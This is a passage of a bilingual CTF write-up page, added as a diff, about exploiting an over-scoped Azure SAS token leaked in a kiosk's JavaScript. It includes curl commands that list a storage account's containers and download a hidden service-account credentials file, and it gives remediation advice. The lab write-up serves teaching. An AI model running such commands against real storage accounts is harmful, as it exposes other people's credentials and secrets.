@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="it" id="html-root">
+<head>
+  <meta charset="UTF-8"/>
+  <!-- flag trattenuta fino a fine evento: nessun valore reale in questo file -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src 'self';"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title data-it="CryptoCabana: SAS over-scope Azure — NonèCostanzo" data-en="CryptoCabana: Azure SAS over-scope — NonèCostanzo">CryptoCabana: SAS over-scope Azure — NonèCostanzo</title>
+  <meta name="description" data-it="Writeup TryHackMe CryptoCabana: un SAS token Azure over-scoped porta a un container nascosto, un service principal e i secret di Key Vault." data-en="Writeup TryHackMe CryptoCabana: an over-scoped Azure SAS token leads to a hidden container, a service principal, and Key Vault secrets." content="Writeup TryHackMe CryptoCabana: un SAS token Azure over-scoped porta a un container nascosto, un service principal e i secret di Key Vault."/>
+  <link rel="canonical" href="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/cryptocabana/"/>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;600;700&family=Barlow+Condensed:wght@700;900&display=swap" rel="stylesheet"/>
+<style>
+    :root{--orange:#ff6a00;--orange-faint:rgba(255,106,0,0.06);--black:#080808;--surface:#101010;--surface2:#161616;--border:#222;--text:#e8e8e8;--muted:#666;--mono:'Share Tech Mono',monospace;--sans:'Barlow',sans-serif;--condensed:'Barlow Condensed',sans-serif}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{background:var(--black);color:var(--text);font-family:var(--sans);font-weight:300;line-height:1.7;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    header{position:sticky;top:0;z-index:100;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+    .header-inner{max-width:960px;margin:0 auto;padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+    .back-link{font-family:var(--mono);font-size:0.75rem;color:var(--muted);letter-spacing:0.1em;transition:color 0.2s;display:flex;align-items:center;gap:0.5rem}
+    .back-link:hover{color:var(--orange)}
+    .logo{font-family:var(--mono);font-size:0.85rem}
+    .logo .dim{color:#fff}.logo .name{color:var(--orange)}
+    .article-header{max-width:960px;margin:0 auto;padding:4rem 2rem 3rem;border-bottom:1px solid var(--border)}
+    .article-meta{display:flex;align-items:center;gap:1.5rem;margin-bottom:2rem;flex-wrap:wrap}
+    .tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;border:1px solid var(--orange);padding:0.2rem 0.6rem}
+    .meta-item{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em}
+    .difficulty-badge{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;display:flex;align-items:center;gap:0.4rem}
+    .dot{width:6px;height:6px;border-radius:50%}
+    h1{font-family:var(--condensed);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;text-transform:uppercase;letter-spacing:-0.01em;line-height:1.05;color:var(--text);margin-bottom:1.5rem}
+    .article-intro{font-size:1.1rem;color:var(--muted);max-width:760px;line-height:1.8}
+    .article-body{max-width:960px;margin:0 auto;padding:3rem 2rem 5rem}
+    .article-body h2{font-family:var(--condensed);font-size:1.6rem;font-weight:700;text-transform:uppercase;letter-spacing:0.04em;color:var(--text);margin:3rem 0 1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border)}
+    .article-body h3{font-family:var(--condensed);font-size:1.2rem;font-weight:700;color:var(--orange);text-transform:uppercase;letter-spacing:0.06em;margin:2rem 0 0.75rem}
+    .article-body p{font-size:1rem;color:#bbb;line-height:1.85;margin-bottom:1.25rem}
+    .article-body strong{color:var(--text);font-weight:600}
+    .article-body em{color:var(--muted);font-style:italic}
+    .article-body ul,.article-body ol{margin:1rem 0 1.25rem 1.5rem}
+    .article-body li{font-size:1rem;color:#bbb;line-height:1.8;margin-bottom:0.4rem}
+    .code-block{background:#0a0a0a;border:1px solid var(--border);border-left:3px solid var(--orange);padding:1.5rem;margin:1.5rem 0;overflow-x:auto}
+    .code-block pre{font-family:var(--mono);font-size:0.78rem;color:var(--orange);line-height:1.8;white-space:pre}
+    .code-block .comment{color:var(--muted)}
+    .code-block .danger{color:#ff3333}
+    .code-block .ok{color:#00ff88}
+    .code-block .neutral{color:#aaa}
+    .code-block .warn{color:#ffaa00}
+    .callout{background:var(--orange-faint);border:1px solid rgba(255,106,0,0.25);border-left:3px solid var(--orange);padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-label{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-red{background:rgba(255,51,51,0.04);border:1px solid rgba(255,51,51,0.2);border-left:3px solid #ff3333;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-red .callout-label{font-family:var(--mono);font-size:0.65rem;color:#ff5555;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-red p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-green{background:rgba(0,255,136,0.03);border:1px solid rgba(0,255,136,0.15);border-left:3px solid #00ff88;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-green .callout-label{font-family:var(--mono);font-size:0.65rem;color:#00ff88;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-green p{font-size:0.9rem;color:var(--text);margin:0}
+    .tldr{background:var(--surface2);border:1px solid var(--border);padding:2rem;margin-bottom:3rem}
+    .tldr-label{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:1rem}
+    .tldr ul{margin-left:1.25rem}
+    .tldr li{font-size:0.9rem;color:var(--text);line-height:1.7;margin-bottom:0.4rem}
+    .tldr p{font-size:0.88rem;color:var(--muted);margin:1rem 0 0;line-height:1.7}
+    table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-family:var(--mono);font-size:0.78rem}
+    th{text-align:left;color:var(--orange);padding:0.6rem 0.75rem;border-bottom:1px solid var(--border);letter-spacing:0.1em;text-transform:uppercase}
+    td{padding:0.55rem 0.75rem;border-bottom:1px solid #1a1a1a;color:#bbb;vertical-align:top}
+    td.ok{color:#00ff88}
+    td.danger{color:#ff5555}
+    td.warn{color:#ffaa00}
+    td strong{color:var(--text)}
+    tr:last-child td{border-bottom:none}
+    .article-footer{border-top:1px solid var(--border);padding:2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+    .article-footer a{font-family:var(--mono);font-size:0.75rem;color:var(--orange);letter-spacing:0.1em;transition:opacity 0.2s}
+    .footer-copy{font-family:var(--mono);font-size:0.65rem;color:var(--muted);opacity:0.5}
+    @media(max-width:768px){h1{font-size:2rem}table{font-size:0.7rem}}
+    .lang-toggle{display:flex;border:1px solid var(--border);overflow:hidden;flex-shrink:0}
+    .lang-btn{font-family:var(--mono);font-size:0.65rem;padding:0.3rem 0.6rem;background:transparent;color:var(--muted);border:none;cursor:pointer;letter-spacing:0.08em;text-transform:uppercase;transition:all .2s}
+    .lang-btn.active{background:var(--orange);color:var(--black)}
+    .lang-btn:hover:not(.active){color:var(--orange)}
+    #read-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:var(--orange);z-index:200;transition:width .08s linear;pointer-events:none}
+    #back-top{position:fixed;bottom:1.75rem;right:1.75rem;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);background:var(--surface);border:1px solid var(--border);padding:0.45rem 0.7rem;cursor:pointer;opacity:0;pointer-events:none;transition:opacity .25s,color .2s,border-color .2s;z-index:150}
+    #back-top.vis{opacity:1;pointer-events:all}
+    #back-top:hover{color:var(--orange);border-color:var(--orange)}
+    .share-wrap{max-width:960px;margin:0 auto;padding:1.5rem 2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;border-top:1px solid var(--border)}
+    .share-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase;flex-shrink:0}
+    .share-btns{display:flex;gap:0.4rem;flex-wrap:wrap}
+    .share-btn{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;color:var(--muted);border:1px solid var(--border);padding:0.3rem 0.65rem;background:transparent;cursor:pointer;transition:color .2s,border-color .2s;text-decoration:none;display:inline-block}
+    .share-btn:hover{color:var(--orange);border-color:var(--orange)}
+    .share-btn.ok{color:#00ff88;border-color:#00ff88}
+    .auth-wrap{display:flex;align-items:center;gap:0.5rem}
+    .auth-bar{width:44px;height:3px;background:var(--border);overflow:hidden;flex-shrink:0}
+    .auth-human{height:100%;background:var(--orange)}
+    .auth-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.08em}
+    .cve-badge{display:inline-block;font-family:var(--mono);font-size:0.7rem;background:rgba(255,51,51,0.08);border:1px solid rgba(255,51,51,0.3);color:#ff5555;padding:0.3rem 0.75rem;letter-spacing:0.05em;margin:0.5rem 0}
+    .lang-en{display:none}
+      /* AUTHOR BOX */
+    .author-box{max-width:760px;margin:3.5rem auto 0;padding:1.75rem;background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--orange)}
+    .author-box .ab-label{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase}
+    .author-box .ab-name{font-family:var(--condensed);font-weight:900;font-size:1.5rem;text-transform:uppercase;color:var(--text);letter-spacing:0.02em;margin-top:0.5rem;line-height:1}
+    .author-box .ab-role{font-family:var(--mono);font-size:0.68rem;color:var(--orange);margin-top:0.45rem;line-height:1.6}
+    .author-box .ab-bio{font-size:0.9rem;color:var(--muted);line-height:1.65;margin-top:0.9rem}
+    .author-box .ab-links{display:flex;flex-wrap:wrap;gap:0.6rem;margin-top:1.2rem;align-items:center}
+    .author-box .ab-links a{font-family:var(--mono);font-size:0.68rem;color:var(--muted);border:1px solid var(--border);padding:0.4rem 0.8rem;letter-spacing:0.08em;transition:border-color .2s,color .2s}
+    .author-box .ab-links a:hover{border-color:var(--orange);color:var(--orange)}
+    .author-box .ab-links a.ab-cta{color:var(--orange);border-color:var(--orange)}
+    .author-box .ab-links a.ab-cta:hover{background:var(--orange);color:var(--black)}
+    @media(max-width:600px){.author-box{margin:2.5rem 1.25rem 0;padding:1.25rem}}
+</style>
+
+  <style>
+    .article-body code,.tldr code,.callout code,.callout-red code,.callout-green code{font-family:var(--mono);color:var(--orange)}
+    .redaction{font-family:var(--mono);color:var(--orange);letter-spacing:2px}
+    .crumb{max-width:960px;margin:0 auto;padding:1rem 2rem 0;font-family:var(--mono);font-size:0.66rem;color:#5f5f5f;letter-spacing:0.08em}
+    .crumb a{color:var(--muted)}.crumb a:hover{color:var(--orange)}.crumb .here{color:var(--orange)}
+    .meme-tag{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;border:1px dashed var(--border);padding:0.25rem 0.6rem}
+  </style>
+  <meta property="og:type" content="article"/>
+  <meta property="og:site_name" content="NonèCostanzo — Paolo Costanzo"/>
+  <meta property="og:title" data-it="CryptoCabana: SAS over-scope Azure — NonèCostanzo" data-en="CryptoCabana: Azure SAS over-scope — NonèCostanzo" content="CryptoCabana: SAS over-scope Azure — NonèCostanzo"/>
+  <meta property="og:description" data-it="Writeup TryHackMe CryptoCabana: un SAS token Azure over-scoped porta a un container nascosto, un service principal e i secret di Key Vault." data-en="Writeup TryHackMe CryptoCabana: an over-scoped Azure SAS token leads to a hidden container, a service principal, and Key Vault secrets." content="Writeup TryHackMe CryptoCabana: un SAS token Azure over-scoped porta a un container nascosto, un service principal e i secret di Key Vault."/>
+  <meta property="og:url" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/cryptocabana/"/>
+  <meta property="og:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/cryptocabana/og.png"/>
+  <meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/>
+  <meta property="og:image:alt" content="CryptoCabana — CTF walkthrough"/>
+  <meta property="og:locale" data-it="it_IT" data-en="en_US" content="it_IT"/>
+  <meta property="article:published_time" content="2026-08-04T09:00:00+02:00"/>
+  <meta property="article:modified_time" content="2026-08-04T09:00:00+02:00"/>
+  <meta property="article:author" content="https://www.paolocostanzo.com"/>
+  <meta property="article:section" content="CTF"/>
+  <meta name="twitter:card" content="summary_large_image"/>
+  <meta name="twitter:title" data-it="CryptoCabana: SAS over-scope Azure — NonèCostanzo" data-en="CryptoCabana: Azure SAS over-scope — NonèCostanzo" content="CryptoCabana: SAS over-scope Azure — NonèCostanzo"/>
+  <meta name="twitter:description" data-it="Writeup TryHackMe CryptoCabana: un SAS token Azure over-scoped porta a un container nascosto, un service principal e i secret di Key Vault." data-en="Writeup TryHackMe CryptoCabana: an over-scoped Azure SAS token leads to a hidden container, a service principal, and Key Vault secrets." content="Writeup TryHackMe CryptoCabana: un SAS token Azure over-scoped porta a un container nascosto, un service principal e i secret di Key Vault."/>
+  <meta name="twitter:image" content="https://paolocostanzo.github.io/ctf/hacker-holidays-2026/cryptocabana/og.png"/>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"TechArticle",
+  "headline":"CryptoCabana: SAS over-scope Azure",
+  "description":"Writeup TryHackMe CryptoCabana: un SAS token Azure over-scoped porta a un container nascosto, un service principal e i secret di Key Vault.",
+  "image":["https://paolocostanzo.github.io/ctf/hacker-holidays-2026/cryptocabana/og.png"],"datePublished":"2026-08-04T09:00:00+02:00","dateModified":"2026-08-04T09:00:00+02:00","inLanguage":"it","articleSection":"CTF",
+  "keywords":"TryHackMe, Hacker Holidays 2026, CryptoCabana, Cloud, TryHackMe, CTF walkthrough",
+  "mainEntityOfPage":{"@type":"WebPage","@id":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/cryptocabana/"},"url":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/cryptocabana/",
+  "author":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com","sameAs":["https://www.linkedin.com/in/paolocostanzoit/","https://github.com/paolocostanzo","https://www.researchgate.net/profile/Paolo-Costanzo-2"]},
+  "publisher":{"@type":"Person","name":"Paolo Costanzo","url":"https://www.paolocostanzo.com"},
+  "about":{"@type":"Thing","name":"TryHackMe — CryptoCabana"}
+}
+  </script>
+  <script type="application/ld+json">
+{
+  "@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[
+    {"@type":"ListItem","position":1,"name":"CTF","item":"https://paolocostanzo.github.io/ctf/"},
+    {"@type":"ListItem","position":2,"name":"Hacker Holidays 2026","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/"},
+    {"@type":"ListItem","position":3,"name":"CryptoCabana","item":"https://paolocostanzo.github.io/ctf/hacker-holidays-2026/cryptocabana/"}
+  ]
+}
+  </script>
+</head>
+
+<body>
+  <div id="read-bar"></div>
+  <header>
+    <div class="header-inner">
+      <a class="back-link" href="/ctf/hacker-holidays-2026/" data-it="← Hacker Holidays 2026" data-en="← Hacker Holidays 2026">← Hacker Holidays 2026</a>
+      <div class="logo"><span class="dim">nonè@</span><span class="name">costanzo</span><span class="dim">:~$</span></div>
+      <div class="lang-toggle">
+        <button class="lang-btn active" onclick="setLang('it')" aria-pressed="true">IT</button>
+        <button class="lang-btn" onclick="setLang('en')" aria-pressed="false">EN</button>
+      </div>
+    </div>
+  </header>
+  <nav class="crumb" aria-label="breadcrumb"><a href="/ctf/">CTF</a> / <a href="/ctf/hacker-holidays-2026/">Hacker Holidays 2026</a> / <span class="here">CryptoCabana</span></nav>
+  <main>
+  <article>
+  <div class="article-header">
+    <div class="article-meta">
+      <span class="tag">Cloud</span><span class="tag">TryHackMe</span>
+      <span class="tag">TryHackMe</span>
+      <time class="meta-item" datetime="2026-08-04" data-it="04 Ago 2026" data-en="04 Aug 2026">04 Ago 2026</time>
+      <span class="meta-item" data-it="6 min di lettura" data-en="6 min read">6 min di lettura</span>
+      <span class="difficulty-badge" style="color:#ffaa00"><span class="dot" style="background:#ffaa00"></span><span>Medium</span></span>
+      <span class="meme-tag" data-it="// backup nel cloud, chiavi nel sorgente" data-en="// backups in the cloud, keys in the source">// backup nel cloud, chiavi nel sorgente</span>
+    </div>
+    <h1 data-it="CryptoCabana: quando il SAS token dice troppo" data-en="CryptoCabana: when the SAS token says too much">CryptoCabana: quando il SAS token dice troppo</h1>
+    <p class="article-intro" data-it="Un chiosco che ti offre di «mettere al sicuro» la tua seed phrase su Azure: cosa mai potrebbe andare storto? Il sito serve al browser un SAS token con uno scope tanto largo da lasciarmi elencare l'intero storage account. Da lì in poi è tutta discesa: un container nascosto, un service principal e un Key Vault. Ti racconto come ci sono arrivato, e perché una rotazione senza pulizia non chiude niente." data-en="A kiosk that offers to &quot;safely back up&quot; your seed phrase on Azure: what could possibly go wrong? The site hands the browser a SAS token scoped so broadly that I could list the entire storage account. From there it's all downhill: a hidden container, a service principal, and a Key Vault. Here's how I got in, and why rotating a secret without cleanup closes nothing.">Un chiosco che ti offre di «mettere al sicuro» la tua seed phrase su Azure: cosa mai potrebbe andare storto? Il sito serve al browser un SAS token con uno scope tanto largo da lasciarmi elencare l'intero storage account. Da lì in poi è tutta discesa: un container nascosto, un service principal e un Key Vault. Ti racconto come ci sono arrivato, e perché una rotazione senza pulizia non chiude niente.</p>
+  </div>
+  <div class="article-body">
+
+    <div class="tldr">
+      <div class="tldr-label" data-it="// TL;DR" data-en="// TL;DR">// TL;DR</div>
+      <ul><li data-it="Un &lt;code&gt;app.js&lt;/code&gt; pubblico espone un &lt;strong&gt;SAS token&lt;/strong&gt; Azure over-scoped (&lt;code&gt;srt=sco&lt;/code&gt;, &lt;code&gt;sp=rl&lt;/code&gt;)." data-en="A public &lt;code&gt;app.js&lt;/code&gt; leaks an over-scoped Azure &lt;strong&gt;SAS token&lt;/strong&gt; (&lt;code&gt;srt=sco&lt;/code&gt;, &lt;code&gt;sp=rl&lt;/code&gt;).">Un <code>app.js</code> pubblico espone un <strong>SAS token</strong> Azure over-scoped (<code>srt=sco</code>, <code>sp=rl</code>).</li><li data-it="&lt;code&gt;?comp=list&lt;/code&gt; a livello account rivela il container nascosto &lt;code&gt;vault&lt;/code&gt;." data-en="&lt;code&gt;?comp=list&lt;/code&gt; at account level reveals the hidden &lt;code&gt;vault&lt;/code&gt; container."><code>?comp=list</code> a livello account rivela il container nascosto <code>vault</code>.</li><li data-it="Un &lt;code&gt;backup-service-account.json&lt;/code&gt; dà un &lt;strong&gt;service principal&lt;/strong&gt;: login e accesso al Key Vault." data-en="A &lt;code&gt;backup-service-account.json&lt;/code&gt; yields a &lt;strong&gt;service principal&lt;/strong&gt;: login and Key Vault access.">Un <code>backup-service-account.json</code> dà un <strong>service principal</strong>: login e accesso al Key Vault.</li><li data-it="&lt;code&gt;key-shard-2&lt;/code&gt; è stato ruotato: la flag è nella &lt;strong&gt;versione precedente&lt;/strong&gt;, ancora abilitata." data-en="&lt;code&gt;key-shard-2&lt;/code&gt; was rotated: the flag lives in the &lt;strong&gt;previous version&lt;/strong&gt;, still enabled."><code>key-shard-2</code> è stato ruotato: la flag è nella <strong>versione precedente</strong>, ancora abilitata.</li><li data-it="Lezione: ruotare un secret &lt;strong&gt;non elimina&lt;/strong&gt; le versioni vecchie." data-en="Lesson: rotating a secret &lt;strong&gt;does not remove&lt;/strong&gt; old versions.">Lezione: ruotare un secret <strong>non elimina</strong> le versioni vecchie.</li></ul>
+    </div>
+
+    <h2 data-it="[01] Recon: il chiosco parla troppo" data-en="[01] Recon: the kiosk talks too much" id='recon'>[01] Recon: il chiosco parla troppo</h2>
+    <p data-it="La landing page non offre appigli, così passo al &lt;em&gt;view-source&lt;/em&gt; e tiro giù &lt;code&gt;app.js&lt;/code&gt;. Il chiosco scrive la &lt;em&gt;recovery phrase&lt;/em&gt; del visitatore direttamente nel blob storage, senza backend in mezzo: significa che la credenziale per farlo &lt;strong&gt;deve&lt;/strong&gt; vivere nella pagina. E infatti." data-en="The landing page offers no handholds, so I move to &lt;em&gt;view-source&lt;/em&gt; and pull &lt;code&gt;app.js&lt;/code&gt;. The kiosk writes the visitor's &lt;em&gt;recovery phrase&lt;/em&gt; straight into blob storage with no backend in between: which means the credential to do it &lt;strong&gt;has to&lt;/strong&gt; live in the page. And there it is.">La landing page non offre appigli, così passo al <em>view-source</em> e tiro giù <code>app.js</code>. Il chiosco scrive la <em>recovery phrase</em> del visitatore direttamente nel blob storage, senza backend in mezzo: significa che la credenziale per farlo <strong>deve</strong> vivere nella pagina. E infatti.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># la landing non dà nulla: vado dritto al JS del chiosco</span>
+<span class="neutral">curl -s https://&lt;target&gt;/app.js | grep -Ei 'storage|sas|container'</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># the landing page gives nothing: straight to the kiosk's JS</span>
+<span class="neutral">curl -s https://&lt;target&gt;/app.js | grep -Ei 'storage|sas|container'</span></pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># credenziali cablate nel client: pubbliche per definizione</span>
+<span class="neutral">const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";</span>
+<span class="neutral">const BACKUPS_CONTAINER = "backups";</span>
+<span class="neutral">const BACKUP_SAS =</span>
+  "?sv=2022-11-02&amp;ss=b&amp;srt=<span class="danger">sco</span>&amp;sp=<span class="danger">rl</span>&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00:00:00Z&amp;spr=https&amp;sig=...";</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># credentials wired into the client: public by definition</span>
+<span class="neutral">const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";</span>
+<span class="neutral">const BACKUPS_CONTAINER = "backups";</span>
+<span class="neutral">const BACKUP_SAS =</span>
+  "?sv=2022-11-02&amp;ss=b&amp;srt=<span class="danger">sco</span>&amp;sp=<span class="danger">rl</span>&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00:00:00Z&amp;spr=https&amp;sig=...";</pre>
+</div></div>
+    <p data-it="Regola numero uno del cloud: &lt;strong&gt;tutto ciò che arriva al browser è pubblico&lt;/strong&gt;. Un SAS token nel JS non è offuscato, è consegnato. E un SAS è un &lt;em&gt;bearer token&lt;/em&gt; in chiaro: &lt;code&gt;srt&lt;/code&gt; e &lt;code&gt;sp&lt;/code&gt; si leggono a occhio nella query string, permessi stampati sulla chiave." data-en="Cloud rule number one: &lt;strong&gt;anything that reaches the browser is public&lt;/strong&gt;. A SAS token in JS isn't obfuscated, it's handed over. And a SAS is a plaintext &lt;em&gt;bearer token&lt;/em&gt;: &lt;code&gt;srt&lt;/code&gt; and &lt;code&gt;sp&lt;/code&gt; read straight off the query string, permissions printed right on the key.">Regola numero uno del cloud: <strong>tutto ciò che arriva al browser è pubblico</strong>. Un SAS token nel JS non è offuscato, è consegnato. E un SAS è un <em>bearer token</em> in chiaro: <code>srt</code> e <code>sp</code> si leggono a occhio nella query string, permessi stampati sulla chiave.</p>
+
+    <h2 data-it="[02] Lo scope del SAS: da un blob all'intero account" data-en="[02] The SAS scope: from one blob to the whole account" id='sas'>[02] Lo scope del SAS: da un blob all'intero account</h2>
+    <p data-it="Scompongo il token. La scadenza al 2099 fa impressione, ma non è quello il problema: è lo &lt;strong&gt;scope&lt;/strong&gt;." data-en="I break the token down. The 2099 expiry looks alarming, but that's not the problem: the &lt;strong&gt;scope&lt;/strong&gt; is.">Scompongo il token. La scadenza al 2099 fa impressione, ma non è quello il problema: è lo <strong>scope</strong>.</p>
+    <table>
+      <thead><tr><th data-it="SAS param" data-en="SAS param">SAS param</th><th data-it="Value" data-en="Value">Value</th><th data-it="Grants" data-en="Grants">Grants</th></tr></thead>
+      <tbody>
+        <tr><td data-it="ss" data-en="ss">ss</td><td data-it="b" data-en="b">b</td><td data-it="blob service only" data-en="blob service only">blob service only</td></tr>
+        <tr><td data-it="srt" data-en="srt">srt</td><td data-it="sco" data-en="sco">sco</td><td data-it="service + container + object" data-en="service + container + object">service + container + object</td></tr>
+        <tr><td data-it="sp" data-en="sp">sp</td><td data-it="rl" data-en="rl">rl</td><td data-it="read + list" data-en="read + list">read + list</td></tr>
+        <tr><td data-it="se" data-en="se">se</td><td data-it="2099-12-31" data-en="2099-12-31">2099-12-31</td><td data-it="~never expires" data-en="~never expires">~never expires</td></tr>
+      </tbody>
+    </table>
+    <p data-it="Ecco l'analisi che conta. Per scrivere un solo blob non serve un Account SAS: basta un &lt;em&gt;Service SAS&lt;/em&gt; sul singolo container/blob con permesso &lt;em&gt;create/write&lt;/em&gt;, meglio se legato a una &lt;em&gt;stored access policy&lt;/em&gt; revocabile. Qui invece &lt;code&gt;srt=sco&lt;/code&gt; include la &lt;strong&gt;s&lt;/strong&gt; di &lt;em&gt;service&lt;/em&gt;: è proprio quella singola lettera che abilita la &lt;code&gt;?comp=list&lt;/code&gt; alla radice dell'account. La distanza tra &lt;code&gt;o&lt;/code&gt;+&lt;code&gt;cw&lt;/code&gt; e &lt;code&gt;sco&lt;/code&gt;+&lt;code&gt;rl&lt;/code&gt; è tutta la vulnerabilità. Ironia: il token è &lt;em&gt;read+list&lt;/em&gt;, quindi non può nemmeno fare la scrittura che il chiosco pretende, ma in compenso mi regala una mappa." data-en="Here's the analysis that matters. To write a single blob you don't need an Account SAS at all: a &lt;em&gt;Service SAS&lt;/em&gt; on the single container/blob with &lt;em&gt;create/write&lt;/em&gt; is enough, ideally tied to a revocable &lt;em&gt;stored access policy&lt;/em&gt;. Instead &lt;code&gt;srt=sco&lt;/code&gt; includes the &lt;strong&gt;s&lt;/strong&gt; for &lt;em&gt;service&lt;/em&gt;: that one letter is exactly what enables &lt;code&gt;?comp=list&lt;/code&gt; at the account root. The gap between &lt;code&gt;o&lt;/code&gt;+&lt;code&gt;cw&lt;/code&gt; and &lt;code&gt;sco&lt;/code&gt;+&lt;code&gt;rl&lt;/code&gt; is the entire vulnerability. Irony: the token is &lt;em&gt;read+list&lt;/em&gt;, so it can't even do the write the kiosk claims to need, but it happily hands me a map.">Ecco l'analisi che conta. Per scrivere un solo blob non serve un Account SAS: basta un <em>Service SAS</em> sul singolo container/blob con permesso <em>create/write</em>, meglio se legato a una <em>stored access policy</em> revocabile. Qui invece <code>srt=sco</code> include la <strong>s</strong> di <em>service</em>: è proprio quella singola lettera che abilita la <code>?comp=list</code> alla radice dell'account. La distanza tra <code>o</code>+<code>cw</code> e <code>sco</code>+<code>rl</code> è tutta la vulnerabilità. Ironia: il token è <em>read+list</em>, quindi non può nemmeno fare la scrittura che il chiosco pretende, ma in compenso mi regala una mappa.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># lo scope 's' (service) abilita la list a livello di account</span>
+curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;&lt;SAS&gt;'</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># the 's' (service) scope enables account-level listing</span>
+curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/?<span class="warn">comp=list</span>&amp;&lt;SAS&gt;'</pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// nota" data-en="// note">// nota</div>
+  <p data-it="Tre container: &lt;code&gt;$web&lt;/code&gt; (il sito), &lt;code&gt;backups&lt;/code&gt; (atteso) e &lt;code&gt;vault&lt;/code&gt;, che non è linkato da nessuna parte nella pagina. Indovina quale ho aperto." data-en="Three containers: &lt;code&gt;$web&lt;/code&gt; (the site), &lt;code&gt;backups&lt;/code&gt; (expected), and &lt;code&gt;vault&lt;/code&gt;, linked nowhere on the page. Guess which one I opened.">Tre container: <code>$web</code> (il sito), <code>backups</code> (atteso) e <code>vault</code>, che non è linkato da nessuna parte nella pagina. Indovina quale ho aperto.</p>
+</div>
+
+    <h2 data-it="[03] Dal container nascosto al Key Vault" data-en="[03] From the hidden container to Key Vault" id='vault'>[03] Dal container nascosto al Key Vault</h2>
+    <p data-it="Il container &lt;code&gt;vault&lt;/code&gt; contiene due blob: &lt;code&gt;seed_phrase.txt&lt;/code&gt;, un depistaggio, e &lt;code&gt;backup-service-account.json&lt;/code&gt;, il vero premio." data-en="The &lt;code&gt;vault&lt;/code&gt; container holds two blobs: &lt;code&gt;seed_phrase.txt&lt;/code&gt;, a decoy, and &lt;code&gt;backup-service-account.json&lt;/code&gt;, the real prize.">Il container <code>vault</code> contiene due blob: <code>seed_phrase.txt</code>, un depistaggio, e <code>backup-service-account.json</code>, il vero premio.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># elenco i blob del container 'vault' e scarico il JSON</span>
+<span class="neutral">curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;&lt;SAS&gt;'</span>
+<span class="neutral">curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?&lt;SAS&gt;'</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># list the 'vault' container's blobs and pull the JSON</span>
